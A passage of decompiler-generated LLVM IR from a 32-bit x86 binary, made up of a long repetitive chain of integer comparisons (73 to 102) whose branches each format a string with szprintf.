  br i1 %v1_804ac3a, label %dec_label_pc_804ac6c, label %dec_label_pc_804ac3c

dec_label_pc_804ac3c:                             ; preds = %dec_label_pc_804ac36
  %v0_804ac3c = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804ac3c = zext i8 %v0_804ac3c to i32
  store i32 %v1_804ac3c, i32* @edx, align 4
  %v0_804ac46 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804ac46 = zext i8 %v0_804ac46 to i32
  %v2_804ac55 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ac55, i32* @ebx, align 4
  %v4_804ac67 = call i32 @szprintf(i32 %v2_804ac55, i32 ptrtoint ([13 x i8]* @global_var_805946a.101 to i32), i32 %v1_804ac46)
  br label %dec_label_pc_804ac6c

dec_label_pc_804ac6c:                             ; preds = %dec_label_pc_804ac36, %dec_label_pc_804ac3c
  %v13_804ac6c = icmp eq i32 %v2_8049ce5, 73
  %v1_804ac70 = icmp eq i1 %v13_804ac6c, false
  br i1 %v1_804ac70, label %dec_label_pc_804aca2, label %dec_label_pc_804ac72

dec_label_pc_804ac72:                             ; preds = %dec_label_pc_804ac6c
  %v0_804ac72 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804ac72 = zext i8 %v0_804ac72 to i32
  store i32 %v1_804ac72, i32* @edx, align 4
  %v0_804ac7c = load i8, i8* @global_var_805e499.29, align 1
  %v1_804ac7c = zext i8 %v0_804ac7c to i32
  %v2_804ac8b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ac8b, i32* @ebx, align 4
  %v4_804ac9d = call i32 @szprintf(i32 %v2_804ac8b, i32 ptrtoint ([13 x i8]* @global_var_8059477.102 to i32), i32 %v1_804ac7c)
  br label %dec_label_pc_804aca2

dec_label_pc_804aca2:                             ; preds = %dec_label_pc_804ac6c, %dec_label_pc_804ac72
  %v13_804aca2 = icmp eq i32 %v2_8049ce5, 74
  %v1_804aca6 = icmp eq i1 %v13_804aca2, false
  br i1 %v1_804aca6, label %dec_label_pc_804acd8, label %dec_label_pc_804aca8

dec_label_pc_804aca8:                             ; preds = %dec_label_pc_804aca2
  %v0_804aca8 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804aca8 = zext i8 %v0_804aca8 to i32
  store i32 %v1_804aca8, i32* @edx, align 4
  %v0_804acb2 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804acb2 = zext i8 %v0_804acb2 to i32
  %v2_804acc1 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804acc1, i32* @ebx, align 4
  %v4_804acd3 = call i32 @szprintf(i32 %v2_804acc1, i32 ptrtoint ([13 x i8]* @global_var_8059484.103 to i32), i32 %v1_804acb2)
  br label %dec_label_pc_804acd8

dec_label_pc_804acd8:                             ; preds = %dec_label_pc_804aca2, %dec_label_pc_804aca8
  %v13_804acd8 = icmp eq i32 %v2_8049ce5, 75
  %v1_804acdc = icmp eq i1 %v13_804acd8, false
  br i1 %v1_804acdc, label %dec_label_pc_804ad0e, label %dec_label_pc_804acde

dec_label_pc_804acde:                             ; preds = %dec_label_pc_804acd8
  %v0_804acde = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804acde = zext i8 %v0_804acde to i32
  store i32 %v1_804acde, i32* @edx, align 4
  %v0_804ace8 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804ace8 = zext i8 %v0_804ace8 to i32
  %v2_804acf7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804acf7, i32* @ebx, align 4
  %v4_804ad09 = call i32 @szprintf(i32 %v2_804acf7, i32 ptrtoint ([13 x i8]* @global_var_8059491.104 to i32), i32 %v1_804ace8)
  br label %dec_label_pc_804ad0e

dec_label_pc_804ad0e:                             ; preds = %dec_label_pc_804acd8, %dec_label_pc_804acde
  %v13_804ad0e = icmp eq i32 %v2_8049ce5, 76
  %v1_804ad12 = icmp eq i1 %v13_804ad0e, false
  br i1 %v1_804ad12, label %dec_label_pc_804ad44, label %dec_label_pc_804ad14

dec_label_pc_804ad14:                             ; preds = %dec_label_pc_804ad0e
  %v0_804ad14 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804ad14 = zext i8 %v0_804ad14 to i32
  store i32 %v1_804ad14, i32* @edx, align 4
  %v0_804ad1e = load i8, i8* @global_var_805e499.29, align 1
  %v1_804ad1e = zext i8 %v0_804ad1e to i32
  %v2_804ad2d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ad2d, i32* @ebx, align 4
  %v4_804ad3f = call i32 @szprintf(i32 %v2_804ad2d, i32 ptrtoint ([13 x i8]* @global_var_805949e.105 to i32), i32 %v1_804ad1e)
  br label %dec_label_pc_804ad44

dec_label_pc_804ad44:                             ; preds = %dec_label_pc_804ad0e, %dec_label_pc_804ad14
  %v13_804ad44 = icmp eq i32 %v2_8049ce5, 77
  %v1_804ad48 = icmp eq i1 %v13_804ad44, false
  br i1 %v1_804ad48, label %dec_label_pc_804ad7a, label %dec_label_pc_804ad4a

dec_label_pc_804ad4a:                             ; preds = %dec_label_pc_804ad44
  %v0_804ad4a = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804ad4a = zext i8 %v0_804ad4a to i32
  store i32 %v1_804ad4a, i32* @edx, align 4
  %v0_804ad54 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804ad54 = zext i8 %v0_804ad54 to i32
  %v2_804ad63 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ad63, i32* @ebx, align 4
  %v4_804ad75 = call i32 @szprintf(i32 %v2_804ad63, i32 ptrtoint ([13 x i8]* @global_var_80594ab.106 to i32), i32 %v1_804ad54)
  br label %dec_label_pc_804ad7a

dec_label_pc_804ad7a:                             ; preds = %dec_label_pc_804ad44, %dec_label_pc_804ad4a
  %v13_804ad7a = icmp eq i32 %v2_8049ce5, 78
  %v1_804ad7e = icmp eq i1 %v13_804ad7a, false
  br i1 %v1_804ad7e, label %dec_label_pc_804adb0, label %dec_label_pc_804ad80

dec_label_pc_804ad80:                             ; preds = %dec_label_pc_804ad7a
  %v0_804ad80 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804ad80 = zext i8 %v0_804ad80 to i32
  store i32 %v1_804ad80, i32* @edx, align 4
  %v0_804ad8a = load i8, i8* @global_var_805e499.29, align 1
  %v1_804ad8a = zext i8 %v0_804ad8a to i32
  %v2_804ad99 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ad99, i32* @ebx, align 4
  %v4_804adab = call i32 @szprintf(i32 %v2_804ad99, i32 ptrtoint ([13 x i8]* @global_var_80594b8.107 to i32), i32 %v1_804ad8a)
  br label %dec_label_pc_804adb0

dec_label_pc_804adb0:                             ; preds = %dec_label_pc_804ad7a, %dec_label_pc_804ad80
  %v13_804adb0 = icmp eq i32 %v2_8049ce5, 79
  %v1_804adb4 = icmp eq i1 %v13_804adb0, false
  br i1 %v1_804adb4, label %dec_label_pc_804ade6, label %dec_label_pc_804adb6

dec_label_pc_804adb6:                             ; preds = %dec_label_pc_804adb0
  %v0_804adb6 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804adb6 = zext i8 %v0_804adb6 to i32
  store i32 %v1_804adb6, i32* @edx, align 4
  %v0_804adc0 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804adc0 = zext i8 %v0_804adc0 to i32
  %v2_804adcf = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804adcf, i32* @ebx, align 4
  %v4_804ade1 = call i32 @szprintf(i32 %v2_804adcf, i32 ptrtoint ([13 x i8]* @global_var_80594c5.108 to i32), i32 %v1_804adc0)
  br label %dec_label_pc_804ade6

dec_label_pc_804ade6:                             ; preds = %dec_label_pc_804adb0, %dec_label_pc_804adb6
  %v10_804ade6 = icmp eq i32 %v2_8049ce5, 80
  %v1_804adea = icmp eq i1 %v10_804ade6, false
  br i1 %v1_804adea, label %dec_label_pc_804ae1c, label %dec_label_pc_804adec

dec_label_pc_804adec:                             ; preds = %dec_label_pc_804ade6
  %v0_804adec = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804adec = zext i8 %v0_804adec to i32
  store i32 %v1_804adec, i32* @edx, align 4
  %v0_804adf6 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804adf6 = zext i8 %v0_804adf6 to i32
  %v2_804ae05 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ae05, i32* @ebx, align 4
  %v4_804ae17 = call i32 @szprintf(i32 %v2_804ae05, i32 ptrtoint ([13 x i8]* @global_var_80594d2.109 to i32), i32 %v1_804adf6)
  br label %dec_label_pc_804ae1c

dec_label_pc_804ae1c:                             ; preds = %dec_label_pc_804ade6, %dec_label_pc_804adec
  %v13_804ae1c = icmp eq i32 %v2_8049ce5, 81
  %v1_804ae20 = icmp eq i1 %v13_804ae1c, false
  br i1 %v1_804ae20, label %dec_label_pc_804ae52, label %dec_label_pc_804ae22

dec_label_pc_804ae22:                             ; preds = %dec_label_pc_804ae1c
  %v0_804ae22 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804ae22 = zext i8 %v0_804ae22 to i32
  store i32 %v1_804ae22, i32* @edx, align 4
  %v0_804ae2c = load i8, i8* @global_var_805e499.29, align 1
  %v1_804ae2c = zext i8 %v0_804ae2c to i32
  %v2_804ae3b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ae3b, i32* @ebx, align 4
  %v4_804ae4d = call i32 @szprintf(i32 %v2_804ae3b, i32 ptrtoint ([13 x i8]* @global_var_80594df.110 to i32), i32 %v1_804ae2c)
  br label %dec_label_pc_804ae52

dec_label_pc_804ae52:                             ; preds = %dec_label_pc_804ae1c, %dec_label_pc_804ae22
  %v13_804ae52 = icmp eq i32 %v2_8049ce5, 82
  %v1_804ae56 = icmp eq i1 %v13_804ae52, false
  br i1 %v1_804ae56, label %dec_label_pc_804ae88, label %dec_label_pc_804ae58

dec_label_pc_804ae58:                             ; preds = %dec_label_pc_804ae52
  %v0_804ae58 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804ae58 = zext i8 %v0_804ae58 to i32
  store i32 %v1_804ae58, i32* @edx, align 4
  %v0_804ae62 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804ae62 = zext i8 %v0_804ae62 to i32
  %v2_804ae71 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ae71, i32* @ebx, align 4
  %v4_804ae83 = call i32 @szprintf(i32 %v2_804ae71, i32 ptrtoint ([13 x i8]* @global_var_80594ec.111 to i32), i32 %v1_804ae62)
  br label %dec_label_pc_804ae88

dec_label_pc_804ae88:                             ; preds = %dec_label_pc_804ae52, %dec_label_pc_804ae58
  %v13_804ae88 = icmp eq i32 %v2_8049ce5, 83
  %v1_804ae8c = icmp eq i1 %v13_804ae88, false
  br i1 %v1_804ae8c, label %dec_label_pc_804aebe, label %dec_label_pc_804ae8e

dec_label_pc_804ae8e:                             ; preds = %dec_label_pc_804ae88
  %v0_804ae8e = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804ae8e = zext i8 %v0_804ae8e to i32
  store i32 %v1_804ae8e, i32* @edx, align 4
  %v0_804ae98 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804ae98 = zext i8 %v0_804ae98 to i32
  %v2_804aea7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aea7, i32* @ebx, align 4
  %v4_804aeb9 = call i32 @szprintf(i32 %v2_804aea7, i32 ptrtoint ([13 x i8]* @global_var_80594f9.112 to i32), i32 %v1_804ae98)
  br label %dec_label_pc_804aebe

dec_label_pc_804aebe:                             ; preds = %dec_label_pc_804ae88, %dec_label_pc_804ae8e
  %v13_804aebe = icmp eq i32 %v2_8049ce5, 84
  %v1_804aec2 = icmp eq i1 %v13_804aebe, false
  br i1 %v1_804aec2, label %dec_label_pc_804aef4, label %dec_label_pc_804aec4

dec_label_pc_804aec4:                             ; preds = %dec_label_pc_804aebe
  %v0_804aec4 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804aec4 = zext i8 %v0_804aec4 to i32
  store i32 %v1_804aec4, i32* @edx, align 4
  %v0_804aece = load i8, i8* @global_var_805e499.29, align 1
  %v1_804aece = zext i8 %v0_804aece to i32
  %v2_804aedd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aedd, i32* @ebx, align 4
  %v4_804aeef = call i32 @szprintf(i32 %v2_804aedd, i32 ptrtoint ([13 x i8]* @global_var_8059506.113 to i32), i32 %v1_804aece)
  br label %dec_label_pc_804aef4

dec_label_pc_804aef4:                             ; preds = %dec_label_pc_804aebe, %dec_label_pc_804aec4
  %v13_804aef4 = icmp eq i32 %v2_8049ce5, 85
  %v1_804aef8 = icmp eq i1 %v13_804aef4, false
  br i1 %v1_804aef8, label %dec_label_pc_804af2a, label %dec_label_pc_804aefa

dec_label_pc_804aefa:                             ; preds = %dec_label_pc_804aef4
  %v0_804aefa = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804aefa = zext i8 %v0_804aefa to i32
  store i32 %v1_804aefa, i32* @edx, align 4
  %v0_804af04 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804af04 = zext i8 %v0_804af04 to i32
  %v2_804af13 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804af13, i32* @ebx, align 4
  %v4_804af25 = call i32 @szprintf(i32 %v2_804af13, i32 ptrtoint ([13 x i8]* @global_var_8059513.114 to i32), i32 %v1_804af04)
  br label %dec_label_pc_804af2a

dec_label_pc_804af2a:                             ; preds = %dec_label_pc_804aef4, %dec_label_pc_804aefa
  %v13_804af2a = icmp eq i32 %v2_8049ce5, 86
  %v1_804af2e = icmp eq i1 %v13_804af2a, false
  br i1 %v1_804af2e, label %dec_label_pc_804af60, label %dec_label_pc_804af30

dec_label_pc_804af30:                             ; preds = %dec_label_pc_804af2a
  %v0_804af30 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804af30 = zext i8 %v0_804af30 to i32
  store i32 %v1_804af30, i32* @edx, align 4
  %v0_804af3a = load i8, i8* @global_var_805e499.29, align 1
  %v1_804af3a = zext i8 %v0_804af3a to i32
  %v2_804af49 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804af49, i32* @ebx, align 4
  %v4_804af5b = call i32 @szprintf(i32 %v2_804af49, i32 ptrtoint ([13 x i8]* @global_var_8059520.115 to i32), i32 %v1_804af3a)
  br label %dec_label_pc_804af60

dec_label_pc_804af60:                             ; preds = %dec_label_pc_804af2a, %dec_label_pc_804af30
  %v13_804af60 = icmp eq i32 %v2_8049ce5, 87
  %v1_804af64 = icmp eq i1 %v13_804af60, false
  br i1 %v1_804af64, label %dec_label_pc_804af96, label %dec_label_pc_804af66

dec_label_pc_804af66:                             ; preds = %dec_label_pc_804af60
  %v0_804af66 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804af66 = zext i8 %v0_804af66 to i32
  store i32 %v1_804af66, i32* @edx, align 4
  %v0_804af70 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804af70 = zext i8 %v0_804af70 to i32
  %v2_804af7f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804af7f, i32* @ebx, align 4
  %v4_804af91 = call i32 @szprintf(i32 %v2_804af7f, i32 ptrtoint ([13 x i8]* @global_var_805952d.116 to i32), i32 %v1_804af70)
  br label %dec_label_pc_804af96

dec_label_pc_804af96:                             ; preds = %dec_label_pc_804af60, %dec_label_pc_804af66
  %v13_804af96 = icmp eq i32 %v2_8049ce5, 88
  %v1_804af9a = icmp eq i1 %v13_804af96, false
  br i1 %v1_804af9a, label %dec_label_pc_804afcc, label %dec_label_pc_804af9c

dec_label_pc_804af9c:                             ; preds = %dec_label_pc_804af96
  %v0_804af9c = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804af9c = zext i8 %v0_804af9c to i32
  store i32 %v1_804af9c, i32* @edx, align 4
  %v0_804afa6 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804afa6 = zext i8 %v0_804afa6 to i32
  %v2_804afb5 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804afb5, i32* @ebx, align 4
  %v4_804afc7 = call i32 @szprintf(i32 %v2_804afb5, i32 ptrtoint ([13 x i8]* @global_var_805953a.117 to i32), i32 %v1_804afa6)
  br label %dec_label_pc_804afcc

dec_label_pc_804afcc:                             ; preds = %dec_label_pc_804af96, %dec_label_pc_804af9c
  %v13_804afcc = icmp eq i32 %v2_8049ce5, 89
  %v1_804afd0 = icmp eq i1 %v13_804afcc, false
  br i1 %v1_804afd0, label %dec_label_pc_804b002, label %dec_label_pc_804afd2

dec_label_pc_804afd2:                             ; preds = %dec_label_pc_804afcc
  %v0_804afd2 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804afd2 = zext i8 %v0_804afd2 to i32
  store i32 %v1_804afd2, i32* @edx, align 4
  %v0_804afdc = load i8, i8* @global_var_805e499.29, align 1
  %v1_804afdc = zext i8 %v0_804afdc to i32
  %v2_804afeb = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804afeb, i32* @ebx, align 4
  %v4_804affd = call i32 @szprintf(i32 %v2_804afeb, i32 ptrtoint ([13 x i8]* @global_var_8059547.118 to i32), i32 %v1_804afdc)
  br label %dec_label_pc_804b002

dec_label_pc_804b002:                             ; preds = %dec_label_pc_804afcc, %dec_label_pc_804afd2
  %v13_804b002 = icmp eq i32 %v2_8049ce5, 90
  %v1_804b006 = icmp eq i1 %v13_804b002, false
  br i1 %v1_804b006, label %dec_label_pc_804b038, label %dec_label_pc_804b008

dec_label_pc_804b008:                             ; preds = %dec_label_pc_804b002
  %v0_804b008 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b008 = zext i8 %v0_804b008 to i32
  store i32 %v1_804b008, i32* @edx, align 4
  %v0_804b012 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b012 = zext i8 %v0_804b012 to i32
  %v2_804b021 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b021, i32* @ebx, align 4
  %v4_804b033 = call i32 @szprintf(i32 %v2_804b021, i32 ptrtoint ([13 x i8]* @global_var_8059554.119 to i32), i32 %v1_804b012)
  br label %dec_label_pc_804b038

dec_label_pc_804b038:                             ; preds = %dec_label_pc_804b002, %dec_label_pc_804b008
  %v13_804b038 = icmp eq i32 %v2_8049ce5, 91
  %v1_804b03c = icmp eq i1 %v13_804b038, false
  br i1 %v1_804b03c, label %dec_label_pc_804b06e, label %dec_label_pc_804b03e

dec_label_pc_804b03e:                             ; preds = %dec_label_pc_804b038
  %v0_804b03e = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b03e = zext i8 %v0_804b03e to i32
  store i32 %v1_804b03e, i32* @edx, align 4
  %v0_804b048 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b048 = zext i8 %v0_804b048 to i32
  %v2_804b057 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b057, i32* @ebx, align 4
  %v4_804b069 = call i32 @szprintf(i32 %v2_804b057, i32 ptrtoint ([13 x i8]* @global_var_8059561.120 to i32), i32 %v1_804b048)
  br label %dec_label_pc_804b06e

dec_label_pc_804b06e:                             ; preds = %dec_label_pc_804b038, %dec_label_pc_804b03e
  %v13_804b06e = icmp eq i32 %v2_8049ce5, 92
  %v1_804b072 = icmp eq i1 %v13_804b06e, false
  br i1 %v1_804b072, label %dec_label_pc_804b0a4, label %dec_label_pc_804b074

dec_label_pc_804b074:                             ; preds = %dec_label_pc_804b06e
  %v0_804b074 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b074 = zext i8 %v0_804b074 to i32
  store i32 %v1_804b074, i32* @edx, align 4
  %v0_804b07e = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b07e = zext i8 %v0_804b07e to i32
  %v2_804b08d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b08d, i32* @ebx, align 4
  %v4_804b09f = call i32 @szprintf(i32 %v2_804b08d, i32 ptrtoint ([13 x i8]* @global_var_805956e.121 to i32), i32 %v1_804b07e)
  br label %dec_label_pc_804b0a4

dec_label_pc_804b0a4:                             ; preds = %dec_label_pc_804b06e, %dec_label_pc_804b074
  %v13_804b0a4 = icmp eq i32 %v2_8049ce5, 93
  %v1_804b0a8 = icmp eq i1 %v13_804b0a4, false
  br i1 %v1_804b0a8, label %dec_label_pc_804b0da, label %dec_label_pc_804b0aa

dec_label_pc_804b0aa:                             ; preds = %dec_label_pc_804b0a4
  %v0_804b0aa = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b0aa = zext i8 %v0_804b0aa to i32
  store i32 %v1_804b0aa, i32* @edx, align 4
  %v0_804b0b4 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b0b4 = zext i8 %v0_804b0b4 to i32
  %v2_804b0c3 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b0c3, i32* @ebx, align 4
  %v4_804b0d5 = call i32 @szprintf(i32 %v2_804b0c3, i32 ptrtoint ([13 x i8]* @global_var_805957b.122 to i32), i32 %v1_804b0b4)
  br label %dec_label_pc_804b0da

dec_label_pc_804b0da:                             ; preds = %dec_label_pc_804b0a4, %dec_label_pc_804b0aa
  %v13_804b0da = icmp eq i32 %v2_8049ce5, 94
  %v1_804b0de = icmp eq i1 %v13_804b0da, false
  br i1 %v1_804b0de, label %dec_label_pc_804b110, label %dec_label_pc_804b0e0

dec_label_pc_804b0e0:                             ; preds = %dec_label_pc_804b0da
  %v0_804b0e0 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b0e0 = zext i8 %v0_804b0e0 to i32
  store i32 %v1_804b0e0, i32* @edx, align 4
  %v0_804b0ea = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b0ea = zext i8 %v0_804b0ea to i32
  %v2_804b0f9 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b0f9, i32* @ebx, align 4
  %v4_804b10b = call i32 @szprintf(i32 %v2_804b0f9, i32 ptrtoint ([13 x i8]* @global_var_80592ed.72 to i32), i32 %v1_804b0ea)
  br label %dec_label_pc_804b110

dec_label_pc_804b110:                             ; preds = %dec_label_pc_804b0da, %dec_label_pc_804b0e0
  %v13_804b110 = icmp eq i32 %v2_8049ce5, 95
  %v1_804b114 = icmp eq i1 %v13_804b110, false
  br i1 %v1_804b114, label %dec_label_pc_804b146, label %dec_label_pc_804b116

dec_label_pc_804b116:                             ; preds = %dec_label_pc_804b110
  %v0_804b116 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b116 = zext i8 %v0_804b116 to i32
  store i32 %v1_804b116, i32* @edx, align 4
  %v0_804b120 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b120 = zext i8 %v0_804b120 to i32
  %v2_804b12f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b12f, i32* @ebx, align 4
  %v4_804b141 = call i32 @szprintf(i32 %v2_804b12f, i32 ptrtoint ([13 x i8]* @global_var_8059588.123 to i32), i32 %v1_804b120)
  br label %dec_label_pc_804b146

dec_label_pc_804b146:                             ; preds = %dec_label_pc_804b110, %dec_label_pc_804b116
  %v10_804b146 = icmp eq i32 %v2_8049ce5, 96
  %v1_804b14a = icmp eq i1 %v10_804b146, false
  br i1 %v1_804b14a, label %dec_label_pc_804b17c, label %dec_label_pc_804b14c

dec_label_pc_804b14c:                             ; preds = %dec_label_pc_804b146
  %v0_804b14c = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b14c = zext i8 %v0_804b14c to i32
  store i32 %v1_804b14c, i32* @edx, align 4
  %v0_804b156 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b156 = zext i8 %v0_804b156 to i32
  %v2_804b165 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b165, i32* @ebx, align 4
  %v4_804b177 = call i32 @szprintf(i32 %v2_804b165, i32 ptrtoint ([13 x i8]* @global_var_8059314.75 to i32), i32 %v1_804b156)
  br label %dec_label_pc_804b17c

dec_label_pc_804b17c:                             ; preds = %dec_label_pc_804b146, %dec_label_pc_804b14c
  %v13_804b17c = icmp eq i32 %v2_8049ce5, 97
  %v1_804b180 = icmp eq i1 %v13_804b17c, false
  br i1 %v1_804b180, label %dec_label_pc_804b1b2, label %dec_label_pc_804b182

dec_label_pc_804b182:                             ; preds = %dec_label_pc_804b17c
  %v0_804b182 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b182 = zext i8 %v0_804b182 to i32
  store i32 %v1_804b182, i32* @edx, align 4
  %v0_804b18c = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b18c = zext i8 %v0_804b18c to i32
  %v2_804b19b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b19b, i32* @ebx, align 4
  %v4_804b1ad = call i32 @szprintf(i32 %v2_804b19b, i32 ptrtoint ([13 x i8]* @global_var_8059595.124 to i32), i32 %v1_804b18c)
  br label %dec_label_pc_804b1b2

dec_label_pc_804b1b2:                             ; preds = %dec_label_pc_804b17c, %dec_label_pc_804b182
  %v13_804b1b2 = icmp eq i32 %v2_8049ce5, 98
  %v1_804b1b6 = icmp eq i1 %v13_804b1b2, false
  br i1 %v1_804b1b6, label %dec_label_pc_804b1e8, label %dec_label_pc_804b1b8

dec_label_pc_804b1b8:                             ; preds = %dec_label_pc_804b1b2
  %v0_804b1b8 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b1b8 = zext i8 %v0_804b1b8 to i32
  store i32 %v1_804b1b8, i32* @edx, align 4
  %v0_804b1c2 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b1c2 = zext i8 %v0_804b1c2 to i32
  %v2_804b1d1 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b1d1, i32* @ebx, align 4
  %v4_804b1e3 = call i32 @szprintf(i32 %v2_804b1d1, i32 ptrtoint ([13 x i8]* @global_var_80595a2.125 to i32), i32 %v1_804b1c2)
  br label %dec_label_pc_804b1e8

dec_label_pc_804b1e8:                             ; preds = %dec_label_pc_804b1b2, %dec_label_pc_804b1b8
  %v13_804b1e8 = icmp eq i32 %v2_8049ce5, 99
  %v1_804b1ec = icmp eq i1 %v13_804b1e8, false
  br i1 %v1_804b1ec, label %dec_label_pc_804b21e, label %dec_label_pc_804b1ee

dec_label_pc_804b1ee:                             ; preds = %dec_label_pc_804b1e8
  %v0_804b1ee = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b1ee = zext i8 %v0_804b1ee to i32
  store i32 %v1_804b1ee, i32* @edx, align 4
  %v0_804b1f8 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b1f8 = zext i8 %v0_804b1f8 to i32
  %v2_804b207 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b207, i32* @ebx, align 4
  %v4_804b219 = call i32 @szprintf(i32 %v2_804b207, i32 ptrtoint ([13 x i8]* @global_var_80595af.126 to i32), i32 %v1_804b1f8)
  br label %dec_label_pc_804b21e

dec_label_pc_804b21e:                             ; preds = %dec_label_pc_804b1e8, %dec_label_pc_804b1ee
  %v13_804b21e = icmp eq i32 %v2_8049ce5, 100
  %v1_804b222 = icmp eq i1 %v13_804b21e, false
  br i1 %v1_804b222, label %dec_label_pc_804b254, label %dec_label_pc_804b224

dec_label_pc_804b224:                             ; preds = %dec_label_pc_804b21e
  %v0_804b224 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b224 = zext i8 %v0_804b224 to i32
  store i32 %v1_804b224, i32* @edx, align 4
  %v0_804b22e = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b22e = zext i8 %v0_804b22e to i32
  %v2_804b23d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b23d, i32* @ebx, align 4
  %v4_804b24f = call i32 @szprintf(i32 %v2_804b23d, i32 ptrtoint ([13 x i8]* @global_var_80595bc.127 to i32), i32 %v1_804b22e)
  br label %dec_label_pc_804b254

dec_label_pc_804b254:                             ; preds = %dec_label_pc_804b21e, %dec_label_pc_804b224
  %v13_804b254 = icmp eq i32 %v2_8049ce5, 101
  %v1_804b258 = icmp eq i1 %v13_804b254, false
  br i1 %v1_804b258, label %dec_label_pc_804b28a, label %dec_label_pc_804b25a

dec_label_pc_804b25a:                             ; preds = %dec_label_pc_804b254
  %v0_804b25a = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b25a = zext i8 %v0_804b25a to i32
  store i32 %v1_804b25a, i32* @edx, align 4
  %v0_804b264 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b264 = zext i8 %v0_804b264 to i32
  %v2_804b273 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b273, i32* @ebx, align 4
  %v4_804b285 = call i32 @szprintf(i32 %v2_804b273, i32 ptrtoint ([13 x i8]* @global_var_80595c9.128 to i32), i32 %v1_804b264)
  br label %dec_label_pc_804b28a

dec_label_pc_804b28a:                             ; preds = %dec_label_pc_804b254, %dec_label_pc_804b25a
  %v13_804b28a = icmp eq i32 %v2_8049ce5, 102
  %v1_804b28e = icmp eq i1 %v13_804b28a, false
  br i1 %v1_804b28e, label %dec_label_pc_804b2c0, label %dec_label_pc_804b290

dec_label_pc_804b290:                             ; preds = %dec_label_pc_804b28a
  %v0_804b290 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804b290 = zext i8 %v0_804b290 to i32
  store i32 %v1_804b290, i32* @edx, align 4
  %v0_804b29a = load i8, i8* @global_var_805e499.29, align 1
  %v1_804b29a = zext i8 %v0_804b29a to i32
  %v2_804b2a9 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804b2a9, i32* @ebx, align 4
